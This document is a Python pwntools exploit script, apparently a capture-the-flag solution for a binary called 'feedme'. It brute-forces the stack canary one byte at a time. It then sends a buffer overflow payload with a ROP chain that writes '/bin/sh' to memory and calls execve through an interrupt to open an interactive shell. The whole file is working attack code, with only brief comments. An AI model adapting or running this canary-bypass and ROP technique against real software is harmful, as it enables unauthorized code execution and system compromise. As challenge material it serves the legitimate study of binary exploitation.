from pwn import *

# we keep running the branching processes until we brute force the canary
def breakCanary():
    # the canary always ends with \x00
    known_canary = b"\x00"
    hex_canary = "00"
    canary = 0x0
    inp_bytes = 0x22
    # we have 3 bytes to figure out
    for j in range(0,3):
        # a range of a byte
        for i in range(0xff):
            log.info("trying canary: " + hex(canary) + hex_canary)
            # we tell it the number of bytes that it will be reading, where we start it off right by the canary
            target.send(p32(inp_bytes)[0].to_bytes(1, byteorder = 'little'))
            # padd 0's then our known canary, then our experiment
            target.send(b"0"*0x20 + known_canary + p32(canary)[0].to_bytes(1, byteorder = 'little'))
            output = target.recvuntil(b"exit.")
            # if we guess the right value, then update the canary, and increase the bytes we send next time since we got the right byte
            if b"YUM" in output:
                print("next byte is: " + hex(canary))
                known_canary = known_canary + p32(canary)[0].to_bytes(1, byteorder = 'little')
                inp_bytes = inp_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace("0x", "")
                hex_canary = new_canary + hex_canary
                canary = 0x0
                break
            else:
                canary = canary + 0x1
    return int(hex_canary, 16)

target = process('./feedme')

canary = breakCanary()
log.info("the canary is: " + hex(canary))

# insert canary
payload = b"0" * 0x20 + p32(canary)

# pad more until return address
payload += b"0" * 0xc

# now begins our rop chain that will let use 
# return to instructions that will let us 
# write /bin/sh/ to a writable section
# then pop a shell using an interrupt
payload += p32(0x80bb496)
payload += p32(0x80eaf80)
payload += p32(0x0806f34a) #pop edx
payload += p32(0x6e69622f)
payload += p32(0x0807be31) #mov
payload += p32(0x80bb496)
payload += p32(0x80eaf84)
payload += p32(0x0806f34a)
payload += p32(0x0068732f)
payload += p32(0x0807be31) #mov
payload += p32(0x80bb496)
payload += p32(0xb)
payload += p32(0x0806f34a)
payload += p32(0x0)
payload += p32(0x806f371)
payload += p32(0x0)
payload += p32(0x80eaf80)
payload += p32(0x806fa1e)

# number of bytes we want to save
target.send(b"\x78")
target.send(payload)
target.interactive()

                
                        
